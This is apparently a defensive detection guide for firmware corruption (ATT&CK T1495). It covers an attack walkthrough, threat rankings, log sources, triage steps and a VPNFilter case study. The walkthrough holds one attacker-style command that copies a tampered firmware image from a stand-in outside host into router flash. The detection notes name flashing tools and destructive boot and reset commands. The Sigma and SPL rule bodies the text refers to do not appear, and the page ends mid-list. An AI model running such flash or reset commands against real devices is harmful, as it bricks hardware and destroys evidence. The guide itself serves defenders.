MITRE ATT&CK · IMPACT

T1495 Firmware Corruption

The deepest kind of sabotage. The small program that starts a device — its firmware — is overwritten with garbage or a broken image. Routers, modems, and PCs then never boot again. Even reinstalling the operating system cannot fix it, because the damage sits below the operating system.

Tactic: Impact Impact type: Availability Platforms: Network Devices · Windows · Linux · macOS Version 1.3 No sub-techniques Guide v2.0 · audited

What it is

Overwriting or corrupting the flash memory that holds system BIOS, UEFI, or device firmware, so the device cannot start.

Main risk

Devices are bricked and need hardware swap or manual reflash. Config and forensic evidence can be destroyed at the same time.

Where it lands

SOHO routers and modems, edge firewalls, server BIOS/UEFI, and OT (operational technology) or embedded gear such as PLCs (programmable logic controllers) and gateways.

Detection difficulty

Very high. A dying device often cannot log its own death — the log source dies with the device.

Overview

This page explains firmware corruption in plain language, shows an animated attack and response, and gives you concrete log sources, Sigma rules, and Splunk queries you can adapt.

The idea in one paragraph

Firmware is software stored in non-volatile memory that starts and manages a device. When you press power, the BIOS (Basic Input/Output System) or its modern replacement UEFI (Unified Extensible Firmware Interface) runs first, tests the hardware, and hands control to the operating system. On routers and modems, a similar small program loads the network OS. All of this lives on flash memory — a chip that keeps data without power but can be rewritten.

ATT&CK technique T1495 covers attackers who deliberately overwrite that flash content: the boot program, device firmware, or both. A device whose boot firmware is broken is called bricked — as useful as a brick. Reinstalling Windows or the router OS does not help, because the broken code sits one layer below. Recovery needs a hardware swap or a special low-level reflash, and sometimes the device is gone for good.

The three layers of firmware

"Firmware" covers three different layers, and the attack works differently on each:

  • Boot firmware — BIOS/UEFI on a PC or server, and the bootloader on a router. It runs before the operating system. Corrupt it and the device never boots, so no OS-level backup helps.
  • Device firmware — the code inside a network card, drive controller, camera, or IoT gadget. Corrupt it and one component dies; the device may limp on.
  • Management firmware — the code running the central manager that pushes images to fleets. Corrupt or abuse it and you can destroy many devices at once, which is the TH-02 and TH-06 pattern.

The deeper the layer, the less your normal tools can see or fix it. That single fact explains almost everything else in this guide.

Where it fits in the attack chain

T1495 sits in the Impact tactic — the last stage of an attack. An attacker needs a lot of access first: valid credentials, remote execution, and often administrator or root rights on a management system. Common order:

  • Before: initial access, credential theft, lateral movement to the management plane.
  • The impact: flash write or erase → device cannot boot.
  • After: more destruction, ransom demands, or simply retreat — the damage is obvious by then.

It often overlaps with Disk Wipe (T1561) and Endpoint Denial of Service (T1499). Some ransomware groups corrupt firmware as a pressure tactic; nation-state actors use it to silence a network or destroy evidence.

Why it sits in the Impact tactic

ATT&CK orders tactics by attack life cycle. Initial Access comes first; Impact comes last. Firmware corruption is a last-stage action. The hard part for the attacker is everything before it: admin rights on a management system. The hard part for you is the same: all your useful detections live in the earlier stages.

That is why this page watches the management plane as closely as the flash write itself. A device that logs its own corruption is a luxury you rarely have.

Who has done this (verified cases)

  • Bad Rabbit (S0606) — ransomware that installed a modified bootloader to prevent normal boot.
  • TrickBot (S0266) — crimeware with a "Trickboot" module able to write or erase UEFI/BIOS.
  • VPNFilter (S1010, 2018) — nation-scale router infection whose final stage bricked devices by overwriting flash.
  • AcidRain (2022) — wiper for routers and modems used in the Viasat KA-SAT outage; EU and US attributed the incident to Russian GRU (Medium-High confidence).
  • 2025 Poland Wiper Attacks (C0063) — factory resets that also destroyed forensic evidence.

The same story in words

  1. Step 1 — Pivot into the management VLAN. The attacker already holds stolen admin credentials. From a host inside the IT LAN they reach the management VLAN — a separate network used only to manage devices. No device changes yet, so nothing breaks. The only early clue is a firewall or VPN log showing an unusual source network touching management addresses.
  2. Step 2 — Login to the router admin console. The attacker opens an SSH session to Router A, the edge router at headquarters. The AAA server (authentication, authorization, accounting — the system that checks logins and records every command) records a privileged shell session. Evidence: AAA log with user, source IP, privilege level 15, and a task ID.
  3. Step 3 — Corrupted image download. The attacker pulls a modified firmware image from an outside host onto the device. Evidence: TACACS+ command accounting shows copy tftp://203.0.113.77/fw.bin flash:, and the device log shows a new file in flash memory that is not on the approved-image list.
  4. Step 4 — Flash write, integrity check fails. The device writes the image into flash memory. The digital signature check fails — but the warning goes only to the local console, and the session continues. Evidence: device syslog line about image verification failure, if syslog is forwarded off the box at all.
  5. Step 5 — Router A goes dark. Router A reboots into the broken image and never starts. Its uplink stops passing traffic. Evidence: a sudden syslog silence, then a network management system (NMS) alarm: edge-rtr-01 DOWN. The last AAA session and the outage are minutes apart.
  6. Step 6 — Same attack on Router B; the branch goes dark. The attacker repeats the flash against Router B at the branch office. Phones, tills, and laptops there lose connectivity. Evidence: a second down-alarm at another site, and a matching management-plane login from the same source IP.
  7. Step 7 — The SOC connects the dots. Alone, each alarm looks like a line fault. Together — a burst of device-offline events, firmware-change audit records outside any change window, and silent subnets — the pattern says firmware corruption, not an ISP problem. Evidence: NMS down-burst report plus AAA audit trail plus firmware audit events.
  8. Step 8 — Response and recovery. Responders block the management plane, swap or reflash both routers with a last-known-good image, and restore configurations from off-device backups. Then they rotate device credentials and hunt for the same access pattern elsewhere. Evidence: change records, restored-image hash checks, and bricked units kept as forensic evidence.
Warning The scary part of this story is not the corruption itself — it is steps 1 and 2. The attacker walked into a management network with valid credentials and nobody noticed. Watch who logs in to management planes, from where, and when. That is your earliest detection point.

Try it yourself — safe exercise

You can rehearse every detection in this guide without touching a single device's firmware. All you need is one lab router (or a virtual one) that sends syslog, plus a free Splunk trial.

  1. Point the lab router's syslog at your SIEM. Confirm TACACS+ or AAA command accounting arrives when an admin logs in.
  2. With a change ticket, perform a routine upgrade: copy an approved image, reload, watch the device come back. Keep every log line.
  3. Run the TH-01 SPL from section 5.5 in a 5-minute window around the upgrade. Note that it does not fire — a legitimate reload has an approval trail, not a verification failure.
  4. Replay the TH-01 sample events from section 5.4 into a test index and confirm the rule fires on the failure + reload pairing.
  5. Write down which fields you needed (task_id, cmd, action tag) — that list is your parser requirement.

Never flash hardware you do not own, and never test flashing tools on any device outside a disposable lab you fully control. Firmware damage is permanent by design.

3

Red team perspective

To detect a technique you must understand why attackers pick it and what they need. This section explains the attacker logic — without giving an operational recipe. All command examples are lab-only and exist so you can generate the events your detections should catch.

Why attackers corrupt firmware

  • Maximum availability damage. A bricked device stays down until a human touches the hardware. No reboot fixes it.
  • Anti-forensics. Factory resets and flash overwrites erase configs, keys, and logs stored on the device. In the documented 2025 Poland Wiper Attacks (C0063), factory resets on compromised devices hampered forensic investigations.
  • Pressure. Corruption combined with ransomware tells the victim: pay, or your network stays dark.
  • Cover. A "hardware failure" story is easier to believe than a breach — unless your logs say otherwise.

What an attacker needs first

Firmware corruption is never an opening move. Every documented case required prior access:

  • Administrator or root rights on the device itself, or on a system that manages it.
  • Network reach to a management interface — SSH, web console, or a central manager.
  • A firmware image that runs (or a raw destructive write that does not need to run).
  • Enough quiet time to push the image and force a reload.

This is good news for defenders: every one of those needs leaves traces you can alert on — before the flash is touched.

How it is done — conceptually

  1. Reach the management plane. Stolen credentials, an exposed admin interface, or a compromised jump host gets the attacker into the network that manages devices.
  2. Get a payload to flash. Either a crafted image that replaces the real firmware, or a command that erases flash and leaves it empty.
  3. Write and trigger. The image is written to flash and the device is forced to reload. On endpoints, a flashing utility writes to the BIOS chip.
  4. Fail on purpose. If the image is deliberately broken, the device fails its power-on self-test and never boots. If it is a wipe, there is simply nothing valid to boot.

Real documented variations attack different layers. Bad Rabbit installed a modified bootloader — the small program that loads the OS. TrickBot's "Trickboot" wrote or erased the UEFI/BIOS chip itself. AcidRain was a purpose-built wiper for routers and modems. The 2025 Poland attacks used mass factory resets through a management platform.

Attacker mistakes you can catch Even careful operators slip. They flash an image built for the wrong model, so the device fails at once. They forget the NMS raises a down-alarm within minutes. Why attackers bother at all

Firmware corruption is expensive for the attacker to reach but valuable for three reasons. It removes the defenders' own access at the worst moment. It destroys forensic evidence along with the device. And recovery cannot be bought off with a software patch — which makes it strong pressure in extortion. The cost asymmetry is the point: hours of attacker work create weeks of victim work.

4

Blue team perspective

Defenders face a hard truth here: the corrupted device often cannot report its own corruption. You must lean on systems around it — management servers, AAA logs, monitoring probes, and host telemetry.

How it looks from the SOC

  • Silence. A device that sent syslog every minute goes quiet. Silence is itself an event.
  • Neighbors shout. Routing neighbors report a dead peer; probes mark subnets unreachable.
  • Audit before death. AAA and management-platform logs show who touched the device minutes before it died — or that a factory reset wiped the local evidence.
  • Hardware tells. Devices return from users as "dead"; support tickets spike for one model or site.

Why it matters more than a crash

  • Recovery is measured in days and hardware, not minutes and reboots.
  • Local configs and logs die with the device — off-device backups are your only evidence.
  • Corruption at scale (a site, a provider, an office) is a business-continuity event, not a ticket.
  • Regulators ask how firmware integrity was monitored (see Section 5.1).

The absence-of-logs problem

Normal intrusion analysis starts with the victim machine's logs. Firmware corruption breaks that habit: the victim device is the one thing that cannot testify. Treat the situation like a power outage investigation, not a malware investigation:

  • Silence is a signal. A device that talked every minute and stopped is an event. Ingest a heartbeat (NMS probe status or syslog count per device) so silence becomes queryable.
  • Witnesses are everywhere else. AAA servers, management platforms, neighboring routers, DHCP servers, and the attacker's own network path all logged the event.
  • Order of interviews matters. Pull management-plane logs before anyone resets or reflashes the fleet — every reset destroys what the devices still held.
  • Write the timeline backwards. Start at the down-alarm, walk AAA and syslog backwards until you reach the first management login you cannot explain.

This is why the triage flow below starts with scope and containment, not with the broken device.

Triage flow — when you suspect firmware corruption

  1. Confirm scope. Which devices are dark? One device or many? Same model, same site, same management source?
  2. Freeze the management plane. Block new logins to device management interfaces; do not let the attacker finish the job.
  3. Pull AAA/TACACS+ history. Who logged in, from where, and which commands ran in the 24 hours before the outage?
  4. Pull last syslog before silence. Copy/erase/verify/reload lines and their timestamps are your timeline backbone.
  5. Check host and BMC telemetry. Any flash-tool process on servers, or firmware events on iDRAC/iLO, widens the incident.
  6. Restore. Swap bricked units, flash a verified last-known-good image, restore configs from off-device backups.
  7. Preserve and hunt. Keep bricked units as evidence (chip forensics is possible), rotate credentials, and hunt the same pattern across every site.

The artifacts timeline

Firmware corruption leaves traces in three phases. Knowing the phases helps you reconstruct an incident even when the device itself is silent.

Before the write

  • VPN, firewall, and jump-host sessions reaching the management VLAN.
  • AAA sessions and failed logins against device consoles.
  • Recon: SNMP walks or config pulls from unusual sources.

During the write

  • copy to flash or firmware push in manager audit records.
  • Image verification failure and flash-erase syslog lines.
  • EDR process events for flash tools on endpoint hosts.

After the write

  • Reload or crash lines, then total syslog silence.
  • NMS down-alarms, dead routing peers, unreachable subnets.
  • Tickets and calls from users; DHCP leases expiring in silence.

Panels worth building this week

Four small panels answer most T1495 questions without any new product. Each one is a search from section 5.5 with a chart on top.

  • Management-plane session tape — every AAA session into a management interface, with source IP and time. Unexpected logons at night are your earliest signal.
  • Firmware-change ledger — every copy/write/erase command per device, joined with the change ticket when one exists.
  • Site-down heat map — device-down alarms per site per 10 minutes, so a wiper burst looks like a red block instead of a hundred separate alerts.
  • Attestation status — Secure Boot and measured-boot state per host, refreshed weekly; sudden regressions stand out.

If a panel stays empty for a week, the feed is broken — fix feeds before you tune rules.

5.2

Threat intelligence

Good intelligence answers two questions for this technique: who does this, and how would I know. Collect from layered sources, then turn each verified behavior into a detection or a control.

Sources and collection

  • MITRE ATT&CK — T1495 page plus the software entries cited below give verified procedures.
  • Vendor research — Cisco Talos, SentinelOne, ESET, Microsoft blogs publish firmware-wiper analyses (VPNFilter, AcidRain).
  • Government advisories — CISA alerts and joint statements; EU and US attribution notes for the Viasat incident.
  • ISACs — sector sharing groups (communications, energy, healthcare) circulate device-offline patterns early.
  • Commercial feeds — C2 and infrastructure indicators; useful for the access stage that precedes corruption.
  • Internal telemetry — your own AAA history, NMS baselines, and firmware inventories. This is the best intel you own.

Analysis and application

Turn each report into a question your logs can answer. "Trickboot writes UEFI" becomes: do I log flash-tool processes on endpoints? "AcidRain hit modems at provider scale" becomes: does my NMS alert on down-bursts per site?

Rate every claim before you build on it:

  • High — official procedure in ATT&CK or vendor forensics with published artifacts.
  • Medium — credible public attribution with some inference; treat as planning input, not fact.
  • Low — single-source or contested claims; watch, do not act.

Internal telemetry you already own

Before subscribing to anything, inventory what your own environment records. In most networks this data answers more questions than a paid feed:

  • AAA history — who touches device management, from where, how often. Your baseline of normal is here.
  • Manager audit trails — every firmware push and config change your own team made. Attacks look like deviations from this.
  • NMS health history — how often devices normally flap or go down per site. Thresholds in Section 5.5 come from this.
  • Procurement records — models, firmware versions, end-of-life dates. Feeds the TH-02 and TH-04 preconditions.

From intel to detection — a five-step workflow

  1. Collect — pull the ATT&CK software entries above, plus vendor blogs and CISA advisories, into a shared intel register.
  2. Extract behaviors — write each behavior as one sentence: who, on what platform, doing what, with what trace. Ignore claims you cannot log.
  3. Map to sources — for each behavior, name the log source that would carry the trace (AAA, NMS, EDR, BMC). If no source exists, that is a visibility gap to fix, not a detection to write.
  4. Build and test — write the Sigma rule and SPL, then replay the behavior in your lab (see the test plan at the end of 5.5).

TH-01 — Edge router or firewall flash overwrite Critical Network

Description
Malware or an intruder with root on the device overwrites the firmware image in flash, following the VPNFilter kill-stage pattern. The edge device fails on reload and the site loses its internet boundary.
Preconditions
Root or admin access on the device, or full control of its management plane; a working image push path.
Impact
Site-wide outage, dead VPN and edge filtering, hours-to-days recovery with hardware access, lost local logs.
Why this severity
Single point of failure for an entire site, repeatedly demonstrated in the wild, and recovery needs physical hands.

TH-02 — Mass modem or terminal wiper Critical Network IoT

Description
A purpose-built wiper corrupts firmware on many consumer or industrial modems at once — the AcidRain pattern seen in the Viasat KA-SAT outage. Damage is regional and hits customers who never touched the target.
Preconditions
Distribution into the provider estate (update pipeline, satellite terminal compromise) or a large exposed management surface.
Impact
Tens of thousands of endpoints offline; collateral damage in other countries; weeks of physical replacement.
Why this severity
Scale plus collateral effect plus slow hardware-bound recovery; proven by a real state-level incident.

TH-03 — Server or PC BIOS/UEFI corruption High Endpoint

Description
A flashing utility (flashrom, Intel FPT, AFUWIN) run by malware or a hands-on intruder writes garbage or a broken image to the BIOS chip — the Trickboot pattern. The machine passes nothing after power-on.
Preconditions
Kernel or admin rights on the host; a vulnerable driver or physical access; tools shipped in or already present.
Impact
Host bricked; on a hypervisor host, every guest goes down; chip-level reflash or board swap required.
Why this severity
Few hosts are targeted at a time, but each loss is total and forensically expensive; detection depends on EDR coverage.

TH-04 — OT field device firmware corruption High OT

Description
Firmware of a PLC (programmable logic controller — an industrial control computer) or a field gateway is corrupted through an engineering workstation or a compromised vendor tool. Process control fails with it.
Preconditions
Reach into an OT segment, trust relationships from engineering tools, weak segmentation between IT and OT.
Impact
Production stop, potential safety consequences, specialist hardware and vendor support needed to recover.
Why this severity
Physical-world consequences and long vendor-led recovery; likelihood lower than IT threats but impact is severe.

TH-05 — Bootloader tampering on endpoints Medium Endpoint

Description
The bootloader that loads the operating system is modified so normal boot fails — the documented Bad Rabbit pattern. Overlaps with Disk Wipe T1561.002 (Disk Structure Wipe), where the MBR or boot sector is destroyed; mention both when writing detections.
Preconditions
Admin rights to run boot-configuration tools or write raw disk sectors, usually via ransomware payload.
Impact
Host fails to boot; often recoverable from install media, so damage is per-machine rather than per-site.
Why this severity
Recovery is cheaper than firmware damage and tooling leaves strong EDR traces — but volume can be large during ransomware waves.

TH-06 — Mass factory reset via management plane Medium Network

Description
An intruder with credentials to a central management platform pushes factory resets to many devices at once — the documented 2025 Poland Wiper pattern. Configs, keys, and local logs vanish together.
Preconditions
Stolen manager credentials or a hijacked admin workstation; broad device scope granted to that account.
Impact
Devices stop serving and return to default state; forensic evidence destroyed; recovery from off-device backups only.
Why this severity
Likelihood rises with every stolen credential, but devices are usually reflashed remotely — less brutal than TH-01, yet the evidence loss is a real investigative cost.

How this ranking was built

Each threat was scored on two axes. Likelihood — how often the pattern appears in public reporting and how common its preconditions are. Impact — how much availability damage and how expensive the recovery. TH-01 and TH-02 rank Critical because both have been demonstrated at scale and both need physical recovery. TH-05 and TH-06 rank Medium because recovery is cheaper and tools leave strong traces — but during ransomware waves their volume can still stop normal business. Review this table twice a year: when preconditions change (for example, new management exposure), rankings change.

Benign look-alike · TH-01

Approved upgrades produce the same verbs: copy, flash write, reload. The quiet version has an approval trail — a ticket, a maintenance window, an image from the vendor server in your approved catalog — and the image signature verification succeeds before the reload. The TH-01 rule fires on verification failure plus reload, so an approved upgrade with a valid signature stays quiet while a planted image trips the pair.

TH-02 — Mass modem or terminal wiper

Log sources
NMS alarm stream, provider DHCP/AAA lease records, core router ICMP-watch logs, care-ticket system.
Key fields
event, device, site, devices_down, window_minutes, lease_state.
Normal
A few devices down per site per hour; lease renewals staggered; unreachable counts under tens per minute.
Suspicious
Hundreds of devices at one site down within 10 minutes; lease renewals stop for a whole prefix; ticket volume for one modem model spikes.
Detection logic
Count device_down events grouped by site over a 10-minute window; alert when the count passes 15 (provider: 100). Add a second rule: DHCP renewals for one prefix drop below 20 percent of baseline for 15 minutes.

Field notes: the JSON burst summary is what your NMS should emit — it makes the SPL one-liner trivial. DHCP expiry without renewal is the quiet signal that terminal firmware died (no client, no renew). ICMP replies spike because every probe to every dead device returns unreachable.

Benign look-alike · TH-02

The honest storm: a provider's planned maintenance window touches thousands of terminals on purpose, and the NMS shows them going down in batches. The tells are the maintenance-mode flag on the alarms, the even geographic spread of the plan, and the return-to-service wave that follows. Your tuning answer: feed change windows into the SIEM as a lookup and suppress batch-down alarms that carry the maintenance tag — and alert on any large down-burst that does not carry it.

TH-03 — Server or PC BIOS/UEFI corruption

Log sources
EDR/Sysmon process creation (Event ID 1), Windows TBS and CodeIntegrity events, BMC/iDRAC/iLO logs.
Key fields
Image, CommandLine, User, ParentImage, PCR_index, bmc_user.
Normal
No flashing tools on end-user hosts; BIOS updates only from the vendor tool chain via software distribution, in change windows.
Suspicious
Any flashrom, fpt.exe, AFUWIN, or unknown vendor flasher launched outside software distribution; PCR or measured-boot values changing on unrelated reboots; BMC-initiated firmware updates nobody requested.
Detection logic
Alert on any process-creation event whose image or command line contains flash-utility names — zero tolerance on user endpoints. On servers, alert when a BMC logs a firmware update outside the change calendar.

Field notes: Sysmon Event ID 1 gives Image (full path) and CommandLine; watch the parent — a legit update comes from your software distributor, not from cmd.exe. The TBS event shows TPM Platform Configuration Register (PCR) values shifting, which happens when boot firmware changes. The iDRAC line names the account and source IP.

Benign look-alike · TH-03

The honest flash: your software-distribution system pushes a vendor BIOS update to a fleet of identical servers inside a change window. The tells: the parent process is the distribution agent, the image hash sits in your approved catalog, and the pushes appear on many hosts at once — the exact opposite of one attacker running a tool by hand from cmd.exe. Allow-list the distribution parent and the catalog hashes; everything else stays suspicious.

TH-04 — OT field device firmware corruption

Log sources
Gateway/PLC syslog, OT asset-manager change records, EDR on engineering workstations, jump-host session logs.
Key fields
asset_id, slot, message, source_ip, process, parent.
Normal
Firmware writes only during plant maintenance windows, from the dedicated engineering subnet, with a change ticket ID in the tool.
Suspicious
Firmware write outside the window, image source outside the engineering subnet, signature check failure, watchdog reboots following a write.
Detection logic
Alert when a gateway logs a firmware write whose source is not the engineering subnet, or any signature/integrity failure — followed within 5 minutes by a watchdog or boot failure.

Field notes: slot is the firmware partition; a failed signature check marks the slot invalid and the next boot fails. The EDR line on the engineering workstation shows the tool was launched with a gateway target — correlate its user with the change calendar.

Benign look-alike · TH-04

The honest OT change: a vendor engineer pushes a signed gateway firmware update during a booked maintenance visit. The tells: the session originates from the vendor's registered jump host, the ticket names the site and the image version, and the device records the push with the engineer's identity. Your control: keep an approved-engineer and approved-image list per site type — an unknown identity pushing firmware to an OT gateway should always page, even during a window.

TH-05 — Bootloader tampering on endpoints

Log sources
Sysmon process creation (EID 1) and raw disk access (EID 9), Windows boot-status events, EDR console.
Key fields
Image, CommandLine, Device, WriteLength, boot error codes.
Normal
bcdedit run by admins from management consoles; boot status policy changes only via documented builds; no raw writes to disk 0 from user processes.
Suspicious
bcdedit /set or /deletevalue launched by a user-space parent; unknown binaries writing raw sectors to the system disk; boot manager errors right after such writes.
Detection logic
Alert when bcdedit.exe runs with /set, /deletevalue, or /bootsequence and the parent is not your management agent — or when Sysmon EID 9 shows a user-mode process writing raw sectors to \Device\Harddisk0. Note: this overlaps Disk Wipe T1561.002.

Field notes: the fake parent path AppData\Roaming\svchost.exe is the tell — the real service binary never runs from a user profile. EID 9 raw write to Harddisk0 sector zero area is how a bootloader gets overwritten. The 0xc000000f boot error is what users report afterwards.

Benign look-alike · TH-05

The honest bcdedit run: an admin repairs a boot problem — set the recovery partition active, remove a stale boot entry — from a bastion session with a ticket, on one host, once. The tells: the parent is a normal admin shell, the target list is short, and no raw disk write follows. Your tuning answer: allow-list the repair ticket pattern (documented bcdedit verbs from known admin hosts) and keep raw-write events at critical severity without exceptions.

TH-06 — Mass factory reset via management plane

Log sources
AAA/TACACS+ command accounting, central manager audit logs (SD-WAN manager, FortiManager, DNA Center), config-drift monitor.
Key fields
user, src_ip, cmd, operation, targets, revision_delta.
Normal
Single-device resets during onboarding or RMA, by named staff, one target at a time; config revisions move forward, not back.
Suspicious
One account triggering resets on many devices in minutes; write erase or factory-reset commands outside a change window; config revisions reverting across a site.
Detection logic
Alert when factory_reset operations from one user exceed 3 devices in 10 minutes — or when more than 5 device configs revert to baseline in one hour. Add: any reset outside the change calendar regardless of count.

Field notes: the manager JSON carries targets (count of devices) — that single field makes burst detection easy. The drift alert proves the reset reached the devices even if the manager was later wiped. Keep manager audit logs on the manager, not only on the devices.

Benign look-alike · TH-06

The honest reset wave: a decommissioning project factory-resets 40 retired access points through the manager, with an export taken first. The tells: the device list matches the retirement ticket, the config exports arrive before the resets, and the manager account is the asset team's own. Your control: require the export-before-reset order in the runbook — a reset wave with no preceding exports is a finding even if the ticket exists.

Sigma rules and Splunk SPL

One complete Sigma rule and one matching Splunk SPL query per threat from 5.3. Sigma is a YAML rule format that SIEMs translate into searches; SPL is Splunk's search language. Under each pair you find the mapping note (which real log the rule assumes), false positives, tuning, and severity. Adjust indexes and field names to your environment.

TH-01 — Edge router flash overwrite

Mapping note: the rule uses a generic network syslog source with product: cisco; it maps to IOS/IOS-XE syslog lines forwarded from the device. False positives: change-window upgrades — filter on your change calendar. Tuning: raise to critical when a copy or erase is followed by a reload within 5 minutes; do that correlation in SPL (see below), because Sigma plain selections cannot join events across time. Severity: high as shipped.

Assumptions: network device syslog lands in index=network with sourcetype=syslog, raw vendor lines preserved. The rex pulls a readable action tag; the final line keeps hosts that logged a flash action and a reload in the same 5-minute window — the bricking signature.

TH-02 — Mass modem or terminal wiper

Mapping note: Sigma's application category with a custom network_management product stands in for your NMS alarm stream (Nagios, Zabbix, LibreNMS, or a carrier OSS). False positives: building power work; a dead aggregation node will also down its children — check topology first. Tuning: raise the count for big sites; provider scale should use 100+. Severity: critical — this "many devices, one cause" pattern is the signature of a wiper. Aggregation across sites is cleaner in SPL than Sigma.

Assumptions: NMS alarms land in index=nms with sourcetype=nms:alarms, one event per device-state change, fields device and site extracted (CIM-style). dc() counts distinct devices, so one flapping device cannot inflate the number.

TH-03 — Server or PC BIOS/UEFI corruption

Mapping note: process_creation on Windows maps to Sysmon Event ID 1 or any EDR that feeds process events with CIM names. False positives: the two listed; add your distribution server path as an allow-list. Tuning: on servers, also alert on BMC/iDRAC firmware-update events outside the change calendar (add a second rule from your BMC log). Severity: high — a single hit on a user workstation is unusual enough to investigate.

Assumptions: Sysmon data in index=edr via the Splunk Add-on for Windows, CIM field names (Image, CommandLine). If you use a vendor EDR instead, keep the logic and swap the index and field names. ParentImage is the fastest triage signal: a legit update has the software-distribution agent as parent.

TH-04 — OT field device firmware corruption

Mapping note: the generic network/ot source stands in for gateway or controller syslog forwarded to your OT log collector; most industrial vendors emit lines containing the words matched here. False positives: maintenance-window rollouts — exclude them by time or by source subnet. Tuning: add a companion rule for watchdog/boot-failure messages, and correlate a failed signature check with a reboot within 5 minutes in SPL. Severity: high.

Assumptions: OT gateway syslog in index=ot with sourcetype=ot:gateway:syslog; cidrmatch excludes the dedicated engineering subnet 10.60.8.0/24. Any firmware write from another subnet fires even if the write itself would have succeeded.

TH-05 — Bootloader tampering on endpoints

Mapping note: Sysmon Event ID 1 or EDR process events. False positives: imaging tooling — allow-list the imaging account and parent process. Tuning: pair with Sysmon Event ID 9 (raw disk write) for the stronger signal; a user-profile process writing to \Device\Harddisk0 is almost never good. Severity: high during ransomware activity, medium as a standing rule — your call per environment.

Assumptions: Sysmon in index=edr with CIM names. Event ID 9 with an image under C:\Users\ catches user-mode raw sector writes; adjust to your EDR's field names if raw-access telemetry exists there instead.

TH-06 — Mass factory reset via management plane

Mapping note: the generic network/aaa source maps to TACACS+ accounting records (Cisco ISE, ForgeRock, or open TACACS+) and to RADIUS accounting where commands are recorded. False positives: single-device onboarding resets. Tuning: the rule fires per command; the mass pattern lives in aggregation — count resets per user in SPL and treat 3+ in 10 minutes as critical. Severity: medium per event, critical when aggregated.

Assumptions: TACACS+ accounting in index=network with a *tacacs* sourcetype and fields user, src_ip, cmd, device_id (the NAS address). Even without the count threshold, every single event here deserves a look — resets outside change windows are rare in healthy networks.

Sigma hygiene — keeping six rules maintainable

Rules rot when nobody owns them. Six small habits keep this ruleset alive:

  • One idea per rule. The erase rule and the copy rule stay separate, even when they share a log source, so each can get its own severity and tuning history.
  • Unique, real UUIDs. Each rule keeps its id forever — SIEM tools track rule state by that value. Never reuse or regenerate an id when editing a rule's logic.
  • Status field as a lifecycle. Start experimental, promote to test after the lab plan passes, and record why in the description or a changelog.
  • Falsepositives are documentation, not decoration. Write the actual noisy thing you saw, so the analyst on shift trusts the alert.
  • Tags carry the technique. attack.t1495 ties rules to ATT&CK navigation; add attack.t1561.002 where the overlap is real (TH-05).
  • Review dates on the calendar. Re-run the 30-day baseline every quarter; thresholds drift as the network changes.

Choosing thresholds without guessing

Every rule above carries a number (15 devices, 5 minutes, 3 resets). Do not copy those numbers blindly — derive them:

  • Measure the baseline first. Run the SPL over 30 days with the alert action removed and look at the largest normal values. Set the threshold just above the worst normal day, not at a magic number.
  • Prefer two signals to one strict signal. A copy command alone is noisy; copy plus reload is rare. If a single signal must be noisy, keep its severity low and let the correlation raise it.
  • Write the reasoning down. A comment in the rule ("threshold 15 = twice our worst measured site churn") prevents future arguments and lazy edits.

Linux and macOS detection notes

The ATT&CK platform list includes Linux and macOS, so two honest notes for those estates. On Linux servers, the closest signals are flashrom runs (process audit or EDR), efibootmgr changes, and shim or MOK (machine owner key) enrollment events — treat unexpected MOK enrollment as a high-severity event, because it weakens Secure Boot for everything that follows. On macOS, firmware checks are mostly outside your control: rely on FileVault recovery-key hygiene, MDM attestation of the security chip state where your MDM supports it, and the fact that modern Apple silicon verifies boot integrity in hardware. Keep expectations honest: endpoint firmware attacks on macOS are rare in public reporting, and the practical detection value lives on Windows and network devices.

How to test each rule before it goes live

Every rule in this section can be tested with the sample events you already have. The loop takes minutes and saves hours of tuning later.

  1. Replay the suspicious samples. Load the section 5.4 events into a test index and confirm the rule fires with the expected severity.
  2. Replay the benign look-alike. Feed the benign event from each threat's look-alike card. The rule must stay quiet. If it fires, tighten the filter before an analyst ever sees the alert.
  3. Test the join windows. For the copy-then-reload patterns, move the reload 6 minutes after the copy and confirm a 5-minute rule does not pair them.
  4. Write the result down. One line per test: date, input, expected, seen. Attach it to the rule's ticket so the next editor inherits proof, not folklore.

Real-world case study

VPNFilter (2018) is a documented, public incident — not a composite. Facts below come from the Cisco Talos research disclosure, FBI court filings and press releases, and vendor advisories. Where reporting is approximate, the text says so.

Context

VPNFilter was multi-stage malware. It infected small-office and home routers and network-attached storage (NAS) from several vendors — public reporting names Linksys, MikroTik, Netgear, TP-Link, and others. Researchers estimated more than 500,000 devices in about 54 countries. It survived reboots by living in flash memory, which made it rare among consumer-router malware. In late May 2018 its owners switched on a final, destructive stage that overwrote part of the flash memory and left devices unable to boot.

Quiet infection phase. Talos later assessed that VPNFilter infections dated back to 2016. Infected routers silently downloaded more capabilities. Home and small-office users noticed nothing.

Late May 2018

Kill stage and seizure. Researchers observed the third stage turning destructive: a module that overwrote a portion of flash so devices could not boot — the bricking behavior this guide is about. The FBI seized the main command-and-control domain to cut the malware off from its operators.

Early June 2018

Second bricking wave. Devices used a fallback command-and-control mechanism, and Talos reported a renewed wave of bricking. Researchers began sinkholing the fallback infrastructure to blunt it.

June 2018 onward

Cleanup guidance. Vendors and CERTs advised users to reboot, then factory reset, then update firmware — in that order, because a reboot alone removed the later stages but left the persistent first stage in flash.

Attack chain

Stage 1 — persistence. Installed in flash memory. Survived power cycles, which is why "turn it off and on" never fully cleaned an infected device.

Stage 2 — command and control. Downloaded from hardcoded C2 domains over HTTPS-like channels and fetched stage 3.

Stage 3 — plugins. Capabilities delivered on demand: traffic interception, credential theft from site traffic, and communication over the TOR network.

Kill stage — destruction. Overwrote part of flash memory. The device failed to boot and needed manual recovery or replacement. This is T1495 in the wild.

Detection point

Note The honest answer: researchers found it, victims did not. Talos hunters followed the malware across the internet; antivirus heuristics on endpoints caught later files. Victim SOCs had almost nothing in their logs — consumer routers do not ship with central logging, and the kill stage produced no syslog before death. The practical detection point for an enterprise is one layer out: NMS down-alarms, neighbor routers reporting dead peers, and support-ticket bursts for specific models. That is exactly what Section 5 builds.

Containment

Containment came from infrastructure, not from victims: the FBI seized the main C2 domain so stage 2 could not be delivered at scale; Talos and partners sinkholed fallback domains; vendors blocked or pulled malicious payloads where they could. Enterprise and ISP teams isolated affected address ranges and forced reboots of managed devices — a reboot removed stages 2 and 3 even though stage 1 persisted in flash.

Eradication

Eradication required touching each device: a factory reset to wipe the persistent first stage, then a firmware update to the patched version, then changed admin credentials. For bricked units there was nothing to clean — those devices had to be reflashed over serial or USB in a lab, or simply replaced.

Order matters more than speed. The published guidance put the steps in a strict sequence, and the sequence is the lesson:

  1. Reboot — clears stage 2 and stage 3, which live only in memory. The device appears healthy afterwards. It is not.
